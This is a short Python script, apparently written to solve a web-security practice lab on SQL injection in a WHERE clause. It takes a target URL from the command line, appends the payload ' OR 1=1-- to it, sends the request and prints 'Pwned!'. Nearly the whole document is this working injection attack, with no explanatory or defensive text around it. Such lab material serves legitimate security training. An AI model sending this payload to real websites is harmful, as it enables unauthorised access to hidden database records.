#!/usr/bin/env python3
# https://github.com/wvverez
# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
import sys

if len(sys.argv) != 2:
    print(f"[+] Uso: {sys.argv[0]} (url)")
    sys.exit(1)

url = sys.argv[1]
requests.get(f"{url}'+OR+1=1--")
print(">>> [+] Pwned!")
